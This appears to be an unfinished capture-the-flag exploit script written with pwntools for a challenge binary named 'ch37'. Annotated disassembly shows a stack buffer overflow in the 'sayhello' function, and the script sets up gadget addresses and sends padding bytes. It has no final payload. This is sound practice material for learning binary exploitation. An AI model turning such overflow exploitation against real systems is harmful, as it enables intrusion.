#!/usr/bin/env python3

from pwn import *
#p = remote("178.62.84.158", 30640)
p = process("./ch37")
context.arch = 'amd64'
gdb.attach(p, gdbscript='''
b*sayhello+69
c
''')

pad = b"a"*0xf #pad to ret 

syscall = 0x00000000004000ff
sayhello = 0x0000000000400102
start = 0x00000000004000f0

p.send(b"a"*15)
p.send(b"a"*15)
p.send(b"a"*15)
p.send(b"a"*15)
p.send(b"a"*15)
p.interactive()
#aaaabaaac

'''
Dump of assembler code for function sayhello:
   0x0000000000400102 <+0>:     sub    rsp,0x20
   0x0000000000400106 <+4>:     mov    eax,0x1
   0x000000000040010b <+9>:     mov    edi,0x1
   0x0000000000400110 <+14>:    movabs rsi,0x600197 "What's
   0x000000000040011a <+24>:    mov    edx,0x14
   0x000000000040011f <+29>:    syscall    			sys_write(rdi = 1, rsi = whatname, rdx=0x14)
   
   0x0000000000400121 <+31>:    mov    ecx,17
   0x0000000000400126 <+36>:    movabs rsi,0x600184 		; "Nice to meet you !"
   0x0000000000400130 <+46>:    mov    rdi,rsp
   0x0000000000400133 <+49>:    rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
   
   0x0000000000400135 <+51>:    mov    eax,0x0
   0x000000000040013a <+56>:    mov    rsi,rdi
   0x000000000040013d <+59>:    mov    edi,0x0
   0x0000000000400142 <+64>:    mov    edx,0x320
   0x0000000000400147 <+69>:    syscall 			
   								sys_read(rdi=0,  rsi=rsp, rdx=0x320) rax = read_len
   0x0000000000400149 <+71>:    dec    rax			; read_len -= 1
   
   0x000000000040014c <+74>:    mov    rdi,rsi
   0x000000000040014f <+77>:    add    rdi,rax
   0x0000000000400152 <+80>:    mov    ecx,0x2
   0x0000000000400157 <+85>:    movabs rsi,0x600195
   0x0000000000400161 <+95>:    rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
   
   0x0000000000400163 <+97>:    mov    edx,0x11
   0x0000000000400168 <+102>:   add    rdx,rax
   0x000000000040016b <+105>:   add    rdx,0x2
   0x000000000040016f <+109>:   mov    eax,0x1
   0x0000000000400174 <+114>:   mov    edi,0x1
   0x0000000000400179 <+119>:   mov    rsi,rsp
   0x000000000040017c <+122>:   syscall 			sys_write(rdi = 1, rsi= rsp, rdx=0x11+rax+0x2
   
   0x000000000040017e <+124>:   add    rsp,0x20
   0x0000000000400182 <+128>:   ret  
   '''
